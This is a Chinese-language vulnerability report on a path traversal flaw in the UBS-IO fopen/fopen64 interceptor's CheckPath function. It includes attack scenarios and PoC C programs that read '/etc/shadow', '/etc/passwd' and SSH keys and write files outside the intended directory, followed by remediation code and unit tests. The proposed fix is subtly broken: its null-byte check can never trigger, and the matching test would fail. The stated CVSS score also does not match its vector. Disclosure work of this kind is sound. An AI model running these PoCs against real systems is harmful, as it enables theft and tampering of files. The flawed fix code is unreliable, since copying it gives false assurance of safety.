# VULN-IO-017: FILE流操作函数CheckPath路径验证缺失致任意文件访问

## 漏洞概述

| 属性 | 值 |
|------|-----|
| 漏洞ID | VULN-IO-017 |
| 类型 | Path Traversal (路径遍历) |
| CWE | CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') |
| 严重性 | HIGH |
| 置信度 | 85% |
| 状态 | 已确认 (真实漏洞) |
| 关联漏洞 | VULN-IO-001 (同根因，posix_interceptor.cpp) |

## 受影响代码

### 文件位置

- **主文件**: `ubsio-boostio/src/io_interceptor/src/filestream_interceptor.cpp`
- **接口文件**: `ubsio-boostio/src/io_interceptor/src/filestream_interface.cpp`
- **行号**: 29-41 (CheckPath定义), 43-69 (HookFopen/HookFopen64)
- **函数**: `CheckPath`, `HookFopen`, `HookFopen64`

### 漏洞代码片段

```cpp
// filestream_interceptor.cpp:29-41 - 不安全的路径验证函数
static inline bool CheckPath(const char* path)
{
    if (path == nullptr) {
        errno = EFAULT;
        return false;
    }
    if (path[0] == '\0') {
        errno = ENOENT;
        return false;
    }

    return true;  // 仅检查非空和非空字符串，无路径遍历验证！
}

// filestream_interceptor.cpp:43-55 - fopen hook函数
FILE* HookFopen(const char* file, const char* mode)
{
    if (!CheckPath(file) ||
        !CheckPointer(mode) ||
        !InitNativeHook() ||
        CHECKNATIVEFUNC(fopen)) {
        return nullptr;
    }
    if (CHECKPROXYLOADED || CHECKPROXYFUNC(fopen)) {
        return NATIVE(fopen)(file, mode);  // 路径直接传递，无安全验证！
    }
    return PROXY(fopen)(file, mode);
}

// filestream_interceptor.cpp:57-69 - fopen64 hook函数
FILE* HookFopen64(const char* file, const char* mode)
{
    if (!CheckPath(file) ||
        !CheckPointer(mode) ||
        !InitNativeHook() ||
        CHECKNATIVEFUNC(fopen64)) {
        return nullptr;
    }
    if (CHECKPROXYLOADED || CHECKPROXYFUNC(fopen64)) {
        return NATIVE(fopen64)(file, mode);  // 同样的问题
    }
    return PROXY(fopen64)(file, mode);
}
```

### 入口点 (filestream_interface.cpp)

```cpp
// filestream_interface.cpp - FILE* stream API的拦截入口
extern "C" {
    INTERCEPTOR_API FILE* fopen(const char* filename, const char* mode)  // 行20
    {
        INTERCEPTORLOG_DEBUG("Hooking fopen path(%s) mode(%s).", filename, mode);
        return HookFopen(filename, mode);
    }

    INTERCEPTOR_API FILE* fopen64(const char* file, const char* mode)   // 行26
    {
        INTERCEPTORLOG_DEBUG("Hooking fopen64 path(%s) mode(%s).", file, mode);
        return HookFopen64(file, mode);
    }
}
```

## CheckPath安全检查缺失分析

| 检查项 | 当前状态 | 安全要求 | 风险等级 |
|--------|----------|----------|----------|
| NULL指针检查 | 已实现 | 必须 | - |
| 空字符串检查 | 已实现 | 必须 | - |
| 路径长度检查 | **缺失** | PATH_MAX (4096) | HIGH |
| 路径遍历序列检查 (`../`) | **缺失** | 必须检查 | HIGH |
| 绝对路径限制 | **缺失** | 可配置的白名单 | HIGH |
| 符号链接解析 | **缺失** | realpath规范化 | MEDIUM |
| Null字节注入 | **缺失** | 检查路径中的 `\0` | MEDIUM |

## 漏洞触发条件与攻击场景

### 1. 触发条件

**必要条件:**
1. 目标应用程序通过 `LD_PRELOAD` 加载了 `libock_interceptor.so`
2. 应用程序调用 `fopen()` 或 `fopen64()` 函数
3. 应用程序允许用户输入控制文件路径参数（文件名）

**充分条件:**
- 应用程序未对用户提供的路径进行充分验证
- 应用程序依赖 UBS-IO 进行路径验证（错误的安全假设）
- 应用程序以特权权限运行（如服务进程）

### 2. 数据流分析

```
[用户输入/应用程序]
        │
        ▼
    用户可控文件名 (可能包含 "../" 或绝对路径)
        │
        ▼
[LD_PRELOAD 拦截层]
    filestream_interface.cpp: fopen(filename, mode)
        │
        ▼
[Hook 函数层]
    filestream_interceptor.cpp: HookFopen(file, mode)
        │
        ▼
[验证层 - 有缺陷]
    CheckPath(file)
        │ 仅检查: file != NULL && file[0] != '\0'
        │ 缺失检查: "../" 路径遍历
        │          绝对路径限制
        │          符号链接解析
        │          路径长度限制
        ▼
[执行层]
    NATIVE(fopen)(file, mode) → 直接 libc fopen 调用
    或
    PROXY(fopen)(file, mode) → 发送到远程 UBS-IO 服务器
        │
        ▼
[文件系统]
    打开/读取/写入任意可达文件
```

### 3. 攻击场景

#### 场景 A: 配置文件读取攻击

**攻击背景**: AI推理服务常从配置文件读取参数，配置路径可能用户可控

```
攻击者输入: "../../etc/passwd"
应用程序预期目录: /app/models/configs/
预期行为: 打开模型配置文件
实际行为: 打开 /etc/passwd (如果权限允许)

攻击者输入: "/etc/shadow"
实际行为: 尝试读取系统密码文件
```

#### 场景 B: 日志文件路径操纵

**攻击背景**: 应用程序使用 fopen 打开日志文件

```
攻击者输入: "../../../../root/.bash_history"
应用程序预期: 写入应用日志 /app/logs/operation.log
实际行为: 读取 root 用户历史命令记录

攻击者输入: "/var/log/auth.log"
实际行为: 尝试读取系统认证日志
```

#### 场景 C: 临时文件写入攻击

**攻击背景**: 应用程序创建临时文件处理数据

```
攻击者输入: "../../tmp/malicious_cron.sh"
mode: "w"
应用程序预期目录: /app/temp/
实际行为: 创建恶意脚本文件，可能被 cron 执行

攻击者输入: "/etc/cron.d/evil_task"
mode: "w"
实际行为: 尝试创建 cron 任务文件 (需要root权限)
```

#### 场景 D: 代理模式远程攻击

**攻击背景**: UBS-IO 代理模式，文件操作转发到远程服务器

```
[攻击者控制的客户端]
        │ 构造恶意路径: "../../../remote_sensitive_data"
        │ mode: "r" (读取)
        ▼
[本地 UBS-IO 拦截层]
        │ HookFopen(path, mode)
        │ CheckPath(path) - 仅检查非空，返回 true
        ▼
[远程 UBS-IO 服务器]
        │ PROXY(fopen)(path, mode)
        │ 接收打开请求，执行实际 fopen
        ▼
[远程文件系统]
        │ 打开服务器上的敏感文件
        ▼
    远程敏感数据泄露！
```

### 4. FILE* API 特有风险

与 POSIX fd-based API 不同，FILE* stream API 有以下特殊风险：

| 特性 | 风险说明 |
|------|----------|
| **缓冲机制** | fopen 返回 FILE* 后，后续 fread/fwrite 操作可能泄露更多数据 |
| **模式字符串** | "r"/"w"/"a"/"r+"/"w+"/"a+" 提供不同访问能力 |
| **跨函数链** | fopen → fread → fclose 形成完整的文件操作链 |
| **C标准库集成** | 许多高层 C 函数内部使用 fopen (如 fprintf 到文件) |
| **易用性** | FILE* API 比 fd API 更常用，应用开发者可能错误假设安全 |

### 5. 与 VULN-IO-001 的关系

VULN-IO-017 与 VULN-IO-001 源于同一根本原因：`CheckPath` 函数缺陷。

| 维度 | VULN-IO-001 | VULN-IO-017 |
|------|--------------|--------------|
| 文件 | posix_interceptor.cpp | filestream_interceptor.cpp |
| API类型 | POSIX fd-based (open, creat, unlink) | FILE* stream (fopen, fopen64) |
| Hook函数数量 | 18+ | 2 |
| 常见程度 | 系统级调用，底层使用 | C标准库API，应用层广泛使用 |
| 攻击复杂度 | 中等 | 低 (fopen更易被滥用) |

**重要说明**: 两个漏洞共享同一修复方案，修复 `CheckPath` 函数可同时解决两个漏洞。

## PoC 构造思路

### 环境准备

```bash
# 编译 UBS-IO (如果尚未编译)
cd /home/pwn20tty/Desktop/opencode_project/openeuler/ubs-io/ubsio-boostio
bash build.sh -t release

# 创建测试环境
mkdir -p /tmp/fopen_vuln_test/{safe_zone,secret_area}
echo "SECRET_DATA: admin_password=Sup3rS3cr3t!" > /tmp/fopen_vuln_test/secret_area/credentials.txt
echo "SSH_PRIVATE_KEY..." > /tmp/fopen_vuln_test/secret_area/id_rsa
chmod 600 /tmp/fopen_vuln_test/secret_area/*
echo "normal_config" > /tmp/fopen_vuln_test/safe_zone/app.conf
```

### PoC 程序 - 场景1: 通过 fopen 实现路径遍历读取

```c
// poc_fopen_read.c - 演示 fopen 路径遍历读取攻击
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#define BUF_SIZE 4096

int main(int argc, char *argv[]) {
    // 模拟应用程序预期在 safe_zone 目录下工作
    // 工作目录: /tmp/fopen_vuln_test/safe_zone/
    
    printf("=== VULN-IO-017: fopen Path Traversal PoC ===\n\n");
    
    // 攻击路径列表
    const char *malicious_paths[] = {
        "../secret_area/credentials.txt",           // 单层逃逸
        "../../tmp/fopen_vuln_test/secret_area/id_rsa", // 完整逃逸
        "/etc/passwd",                              // 绝对路径
        "../../../etc/passwd",                      // 多层逃逸
        "/proc/self/cmdline",                       // 进程信息泄露
        NULL
    };
    
    const char *modes[] = {"r", "rb", NULL};
    
    for (int i = 0; malicious_paths[i] != NULL; i++) {
        printf("Testing path: %s\n", malicious_paths[i]);
        
        FILE *fp = fopen(malicious_paths[i], "r");
        if (fp != NULL) {
            printf("  SUCCESS! fopen returned valid FILE*\n");
            
            char buf[BUF_SIZE];
            size_t n = fread(buf, 1, BUF_SIZE - 1, fp);
            if (n > 0) {
                buf[n] = '\0';
                printf("  Read %zu bytes:\n", n);
                // 显示前200字节避免过长输出
                if (n > 200) {
                    printf("  Content (truncated): %.200s...\n", buf);
                } else {
                    printf("  Content: %s\n", buf);
                }
            }
            fclose(fp);
        } else {
            printf("  Failed: %s (errno=%d)\n", strerror(errno), errno);
        }
        printf("\n");
    }
    
    return 0;
}
```

### PoC 程序 - 场景2: 通过 fopen 实现任意文件写入

```c
// poc_fopen_write.c - 演示 fopen 路径遍历写入攻击
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

int main(int argc, char *argv[]) {
    printf("=== VULN-IO-017: fopen Write Attack PoC ===\n\n");
    
    // 攻击者尝试在预期目录外创建/写入文件
    const char *attack_paths[] = {
        "../secret_area/planted_data.txt",
        "../../tmp/fopen_vuln_test/secret_area/backdoor.txt",
        "/tmp/fopen_vuln_test/secret_area/exploit_marker",
        NULL
    };
    
    const char *payload = "MALICIOUS_DATA_INSERTED_BY_ATTACKER\n"
                          "This file was created via path traversal\n";
    
    for (int i = 0; attack_paths[i] != NULL; i++) {
        printf("Attempting to write to: %s\n", attack_paths[i]);
        
        // "w" 模式会创建或覆盖文件
        FILE *fp = fopen(attack_paths[i], "w");
        if (fp != NULL) {
            size_t written = fwrite(payload, 1, strlen(payload), fp);
            printf("  SUCCESS! Wrote %zu bytes outside safe zone!\n", written);
            fclose(fp);
            
            // 验证写入
            fp = fopen(attack_paths[i], "r");
            if (fp) {
                char verify[256];
                fread(verify, 1, 255, fp);
                verify[255] = '\0';
                printf("  Verified content exists: %.50s...\n", verify);
                fclose(fp);
            }
        } else {
            printf("  Failed: %s (errno=%d)\n", strerror(errno), errno);
        }
        printf("\n");
    }
    
    return 0;
}
```

### PoC 程序 - 场景3: 模拟应用程序配置文件读取

```c
// poc_app_simulation.c - 模拟真实应用程序场景
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// 模拟应用程序的配置加载函数
int LoadConfig(const char *config_path) {
    printf("Loading configuration from: %s\n", config_path);
    
    FILE *fp = fopen(config_path, "r");
    if (!fp) {
        printf("  Failed to open config file\n");
        return -1;
    }
    
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        printf("  Config line: %s", line);
    }
    
    fclose(fp);
    return 0;
}

int main(int argc, char *argv[]) {
    printf("=== Simulated Application: Config Loading ===\n\n");
    
    // 假设应用程序从命令行参数接收配置文件路径
    // 正常使用: ./app configs/model.conf
    // 攻击使用: ./app ../../secret_area/credentials.txt
    
    if (argc < 2) {
        printf("Usage: %s <config_file_path>\n", argv[0]);
        printf("\nNormal usage:\n");
        printf("  %s app.conf\n", argv[0]);
        printf("\nAttack usage:\n");
        printf("  %s ../secret_area/credentials.txt\n", argv[0]);
        return 1;
    }
    
    // 切换到预期工作目录
    chdir("/tmp/fopen_vuln_test/safe_zone/");
    
    printf("Current working directory: /tmp/fopen_vuln_test/safe_zone/\n\n");
    
    // 应用程序调用 LoadConfig - 用户提供的路径未经充分验证
    LoadConfig(argv[1]);
    
    return 0;
}
```

### PoC 执行步骤

```bash
# 1. 编译 PoC 程序
gcc -o poc_fopen_read poc_fopen_read.c
gcc -o poc_fopen_write poc_fopen_write.c
gcc -o poc_app_simulation poc_app_simulation.c

# 2. 进入测试目录
cd /tmp/fopen_vuln_test/safe_zone/

# 3. 使用 UBS-IO 拦截器运行 PoC (假设已编译)
LD_PRELOAD=/home/pwn20tty/Desktop/opencode_project/openeuler/ubs-io/ubsio-boostio/build/release/libock_interceptor.so ./poc_fopen_read

# 4. 测试写入攻击
LD_PRELOAD=/path/to/libock_interceptor.so ./poc_fopen_write

# 5. 模拟应用程序场景
LD_PRELOAD=/path/to/libock_interceptor.so ./poc_app_simulation ../secret_area/credentials.txt

# 6. 验证攻击结果
ls -la /tmp/fopen_vuln_test/secret_area/
cat /tmp/fopen_vuln_test/secret_area/credentials.txt  # 漏洞确认：读取了敏感文件
cat /tmp/fopen_vuln_test/secret_area/planted_data.txt # 漏洞确认：攻击者写入成功
```

## 实际可利用性评估

### 综合评估矩阵

| 维度 | 评估 | 说明 |
|------|------|------|
| **前置条件复杂度** | 中等 | 需要应用程序加载 UBS-IO 拦截器，在 AI/ML 场景中常见 |
| **攻击复杂度** | 低 | fopen 是最常用的文件操作 API，路径遍历技术简单 |
| **权限要求** | 中-高 | 取决于应用程序权限，多数服务进程有足够权限 |
| **用户交互** | 低 | 可通过 API 参数、配置文件、命令行等多种途径注入 |
| **影响范围** | 高 | fopen 可读取、写入、创建文件，影响广泛 |
| **远程利用** | 中 | 代理模式下可影响远程服务器文件系统 |
| **检测难度** | 高 | 恶意路径可能被记录，但当前无路径验证日志 |

### CVSS 3.1 评估

```
Attack Vector (AV): Local (L) - 需要本地访问加载拦截器
Attack Complexity (AC): Low (L) - 无需特殊条件，fopen 使用简单
Privileges Required (PR): Low (L) - 需要应用程序权限
User Interaction (UI): None (N) - 无需用户交互
Scope (S): Changed (C) - 可能影响其他资源（代理模式）
Confidentiality Impact (C): High (H) - 可读取敏感文件
Integrity Impact (I): High (H) - 可写入/修改文件
Availability Impact (A): High (H) - 可删除关键文件（通过后续操作）

CVSS Score: 8.4 (HIGH)
Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
```

### 特定场景风险评估

| 应用场景 | 风险等级 | 攻击可能性 | 数据影响 |
|----------|----------|------------|----------|
| AI推理服务配置加载 | **HIGH** | 高 | 模型配置篡改、API密钥泄露 |
| 日志处理服务 | **HIGH** | 高 | 日志注入、敏感日志读取 |
| 数据处理管道 | **HIGH** | 中-高 | 数据泄露、数据污染 |
| 文件上传处理 | **MEDIUM** | 中 | 路径控制需配合其他漏洞 |
| 临时文件处理 | **HIGH** | 高 | 任意位置文件创建 |

## 影响范围

### 直接影响

1. **任意文件读取**: 通过 `fopen(path, "r")` 可读取应用程序可达的任意文件
   - 系统配置文件: `/etc/passwd`, `/etc/shadow`
   - 应用密钥文件: `/app/secrets/api_key.txt`
   - 用户数据: `/home/user/.ssh/id_rsa`

2. **任意文件写入**: 通过 `fopen(path, "w")` 可创建/覆盖任意文件
   - 配置文件篡改
   - 恶意脚本植入
   - 日志文件污染

3. **文件追加**: 通过 `fopen(path, "a")` 可在任意文件末尾追加内容
   - 日志注入攻击
   - 配置项追加

4. **文件探测**: 通过 fopen 返回值可探测文件系统结构
   - 枚举敏感文件位置
   - 验证文件存在性

### 间接影响

1. **权限链利用**: fopen 成功后，后续 fread/fwrite 可实施更多攻击
2. **代理模式传播**: 攻击可能传播到远程 UBS-IO 服务器
3. **服务稳定性**: 关键文件被覆盖可能导致服务崩溃
4. **审计逃避**: 攻击者可读取/修改审计日志
5. **横向移动**: 读取凭证后可能用于进一步攻击

## 修复建议

### 立即缓解措施 (高优先级)

**1. 增强 CheckPath 函数**

由于 VULN-IO-017 与 VULN-IO-001 共享同一缺陷，应统一修复 `CheckPath` 函数。建议的增强版本：

```cpp
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MAX_PATH_LENGTH PATH_MAX  // 通常为 4096

static inline bool CheckPath(const char* path)
{
    // 原有检查
    if (path == nullptr) {
        errno = EFAULT;
        return false;
    }
    if (path[0] == '\0') {
        errno = ENOENT;
        return false;
    }
    
    // 新增: 路径长度检查
    size_t path_len = strlen(path);
    if (path_len > MAX_PATH_LENGTH) {
        INTERCEPTORLOG_WARN("Path too long: %zu > %d", path_len, MAX_PATH_LENGTH);
        errno = ENAMETOOLONG;
        return false;
    }
    
    // 新增: Null字节检查 (防止路径截断攻击)
    for (size_t i = 0; i < path_len; i++) {
        if (path[i] == '\0') {
            INTERCEPTORLOG_WARN("Null byte found in path at position %zu", i);
            errno = EINVAL;
            return false;
        }
    }
    
    // 新增: 路径遍历序列检查
    if (strstr(path, "..") != nullptr) {
        INTERCEPTORLOG_WARN("Path traversal sequence detected: %s", path);
        errno = EINVAL;
        return false;
    }
    
    // 新增: 路径规范化验证 (可选，根据业务需求)
    // 对于已存在的文件使用 realpath
    char resolved_path[PATH_MAX];
    if (realpath(path, resolved_path) != nullptr) {
        // 验证规范化后的路径是否在允许范围内
        // 可配置白名单检查
        INTERCEPTORLOG_DEBUG("Resolved path: %s", resolved_path);
    }
    
    return true;
}
```

**2. 为 fopen 添加额外模式验证**

```cpp
// 在 HookFopen 中添加安全模式检查
static inline bool ValidateFopenMode(const char* mode)
{
    if (mode == nullptr) {
        errno = EINVAL;
        return false;
    }
    
    // 允许的模式
    static const char* valid_modes[] = {
        "r", "rb", "r+", "rb+",          // 读取模式
        "w", "wb", "w+", "wb+",          // 写入模式
        "a", "ab", "a+", "ab+",          // 追加模式
        NULL
    };
    
    for (int i = 0; valid_modes[i] != NULL; i++) {
        if (strcmp(mode, valid_modes[i]) == 0) {
            return true;
        }
    }
    
    INTERCEPTORLOG_WARN("Invalid fopen mode: %s", mode);
    errno = EINVAL;
    return false;
}

FILE* HookFopen(const char* file, const char* mode)
{
    if (!CheckPath(file) ||
        !ValidateFopenMode(mode) ||    // 新增
        !CheckPointer(mode) ||
        !InitNativeHook() ||
        CHECKNATIVEFUNC(fopen)) {
        return nullptr;
    }
    // ... 原有逻辑
}
```

### 深度防御措施 (中期)

**1. 实施路径白名单机制**

```cpp
// interceptor_path_config.h
class PathWhitelist {
private:
    std::vector<std::string> allowed_dirs_;
    bool strict_mode_;
    
public:
    static PathWhitelist& Instance() {
        static PathWhitelist instance;
        return instance;
    }
    
    bool Validate(const char* path) {
        char resolved[PATH_MAX];
        if (realpath(path, resolved) == nullptr) {
            // 文件不存在时的处理逻辑
            return CheckPathPrefix(path);
        }
        
        for (const auto& dir : allowed_dirs_) {
            if (strncmp(resolved, dir.c_str(), dir.length()) == 0) {
                if (resolved[dir.length()] == '/' || 
                    resolved[dir.length()] == '\0') {
                    return true;
                }
            }
        }
        
        INTERCEPTORLOG_WARN("Path rejected: %s -> %s", path, resolved);
        return false;
    }
};
```

**2. 添加安全审计日志**

```cpp
// 在 HookFopen 中添加审计
FILE* HookFopen(const char* file, const char* mode)
{
    // 记录所有 fopen 请求
    INTERCEPTORLOG_AUDIT("fopen request: path=%s, mode=%s, caller=%s",
                         file, mode, GetCallerInfo());
    
    if (!CheckPath(file)) {
        INTERCEPTORLOG_AUDIT("fopen REJECTED: path validation failed for %s", file);
        return nullptr;
    }
    
    // ... 执行操作
    
    INTERCEPTORLOG_AUDIT("fopen SUCCESS: path=%s, result=%p", file, result);
    return result;
}
```

### 统一修复策略

由于 VULN-IO-017 与 VULN-IO-001 共享同一根因，建议：

1. **统一修复 `CheckPath` 函数**：同时修改 `posix_interceptor.cpp` 和 `filestream_interceptor.cpp`
2. **共享验证逻辑**：将增强版 `CheckPath` 放入公共头文件，两个模块共用
3. **配置化安全策略**：通过配置文件定义允许的目录和操作规则
4. **全面回归测试**：修复后对所有文件操作 Hook 函数进行安全测试

## 测试验证建议

### 单元测试

```cpp
// test_fopen_path_validation.cpp
#include "filestream_interceptor.h"
#include <gtest/gtest.h>
#include <fstream>

class FopenPathValidationTest : public ::testing::Test {
protected:
    void SetUp() override {
        // 创建测试目录结构
        system("mkdir -p /tmp/test_fopen/safe_dir");
        system("mkdir -p /tmp/test_fopen/restricted_dir");
        system("echo 'safe_content' > /tmp/test_fopen/safe_dir/safe.txt");
        system("echo 'secret' > /tmp/test_fopen/restricted_dir/secret.txt");
        chdir("/tmp/test_fopen/safe_dir");
    }
};

TEST_F(FopenPathValidationTest, RejectTraversalSequence) {
    // 测试路径遍历序列被拒绝
    EXPECT_FALSE(CheckPath("../restricted_dir/secret.txt"));
    EXPECT_FALSE(CheckPath("../../tmp/test_fopen/restricted_dir"));
    EXPECT_FALSE(CheckPath(".."));
}

TEST_F(FopenPathValidationTest, RejectNullByteInjection) {
    // 测试 Null 字节注入被拒绝
    char malicious[] = "safe.txt\0../restricted_dir/secret.txt";
    EXPECT_FALSE(CheckPath(malicious));
}

TEST_F(FopenPathValidationTest, RejectTooLongPath) {
    // 测试超长路径被拒绝
    char long_path[5000];
    memset(long_path, 'a', 4999);
    long_path[4999] = '\0';
    EXPECT_FALSE(CheckPath(long_path));
}

TEST_F(FopenPathValidationTest, AcceptValidPath) {
    // 测试有效路径被接受
    EXPECT_TRUE(CheckPath("safe.txt"));
    EXPECT_TRUE(CheckPath("subdir/file.txt"));
}
```

### 集成测试场景

建议在 UBS-IO 集成测试框架中添加以下场景：

| 场景ID | 测试内容 | 预期结果 |
|--------|----------|----------|
| IT-FOPEN-001 | fopen("..") | 应返回 NULL |
| IT-FOPEN-002 | fopen("../etc/passwd") | 应返回 NULL |
| IT-FOPEN-003 | fopen("/etc/shadow") | 应返回 NULL (需白名单配置) |
| IT-FOPEN-004 | fopen("valid.txt", "r") | 应成功打开 |
| IT-FOPEN-005 | fopen with 5000+ char path | 应返回 NULL |
| IT-FOPEN-006 | fopen64 path traversal | 应返回 NULL |

## 参考资料

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [SEI CERT C Coding Standard: FIO02-C. Canonicalize path names originating from untrusted sources](https://wiki.sei.cmu.edu/confluence/display/c/FIO02-C)
- [CWE-23: Relative Path Traversal](https://cwe.mitre.org/data/definitions/23.html)
- [CWE-36: Absolute Path Traversal](https://cwe.mitre.org/data/definitions/36.html)

## 结论

**漏洞状态: 已确认 (TRUE POSITIVE)**

VULN-IO-017 是一个真实的路径遍历漏洞，源于 `filestream_interceptor.cpp` 中 `CheckPath` 函数的安全验证缺陷。该漏洞与 VULN-IO-001 共享同一根因，影响 UBS-IO 的 FILE* stream API 拦截层。

**核心风险:**
- fopen/fopen64 是 C 标准库最常用的文件操作函数
- 应用层广泛使用，攻击入口点多
- 可实现任意文件读取、写入、创建
- 代理模式下可影响远程服务器

**修复优先级: HIGH**

**建议行动:**
1. 立即增强 `CheckPath` 函数（统一修复 VULN-IO-001 和 VULN-IO-017）
2. 添加路径白名单配置机制
3. 实施安全审计日志
4. 进行全面的回归安全测试

**相关漏洞:**
- VULN-IO-001: Path Traversal in POSIX Hooks (posix_interceptor.cpp)
- VULN-IO-011: Path Traversal in File Open Hooks (同一根因)
- VULN-IO-012: Path Traversal in File Deletion Hooks (同一根因)

---

*报告生成时间: 2026-04-20*
*分析工具: Static Analysis + Manual Review*
